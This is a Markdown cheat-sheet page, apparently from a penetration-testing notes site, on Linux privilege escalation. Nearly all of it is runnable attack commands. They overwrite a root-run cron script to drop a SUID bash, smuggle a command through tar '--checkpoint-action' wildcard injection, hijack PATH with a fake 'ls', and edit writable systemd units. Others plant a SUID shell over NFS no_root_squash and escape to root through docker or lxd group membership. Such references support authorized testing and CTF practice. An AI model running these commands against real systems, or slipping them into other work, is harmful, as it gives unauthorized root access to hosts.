---
title: Cron, Services & PATH Hijack
category: privesc-linux
description: Writable scripts, weak PATH, and timer abuse.
tags: [linux, privesc, cron, path]
os: [linux]
order: 20
---

## Inspect cron

```bash
cat /etc/crontab /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.{hourly,daily,weekly,monthly} 2>/dev/null
crontab -l ; sudo crontab -l 2>/dev/null
systemctl list-timers --all
pspy64 -pf -i 1000     # see commands as they run
```

## Writable cron script / target

```bash
# Cron runs /opt/backup.sh as root and you can write it
echo '#!/bin/bash' > /opt/backup.sh
echo 'cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash' >> /opt/backup.sh
chmod +x /opt/backup.sh
# Wait, then:
/tmp/rbash -p
```

## Wildcard injection

If cron runs `tar czf /backup.tar.gz *` in a writable dir:

```bash
cd /writable/dir
echo 'cp /bin/bash /tmp/rbash; chmod +s /tmp/rbash' > x.sh
chmod +x x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'
```

Same idea with `chown`, `chmod`, `rsync` — abuse `--reference=`, `--rsh=`, etc.

## PATH hijacking

When a SUID/root script calls a binary by name (not full path) and `.` or a writable dir is in PATH:

```bash
echo '#!/bin/sh' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# trigger the vulnerable script
```

## Writable systemd service / timer

```bash
find /etc/systemd /lib/systemd /run/systemd -writable 2>/dev/null
# Edit Service ExecStart= to your payload, then:
systemctl daemon-reload
systemctl restart vulnservice
```

## NFS no_root_squash

```bash
# On attacker (root on own box)
showmount -e {{RHOST}}
mkdir /mnt/nfs; mount -t nfs {{RHOST}}:/share /mnt/nfs
cp /bin/bash /mnt/nfs/rbash
chown root:root /mnt/nfs/rbash
chmod 4755 /mnt/nfs/rbash
# On victim:
/share/rbash -p
```

## Docker / lxd group

```bash
# docker group → root trivially
docker run -v /:/host -it alpine chroot /host /bin/sh

# lxd/lxc group
lxc image import alpine.tar.gz --alias p
lxc init p p -c security.privileged=true
lxc config device add p host disk source=/ path=/mnt/root recursive=true
lxc start p
lxc exec p /bin/sh
```
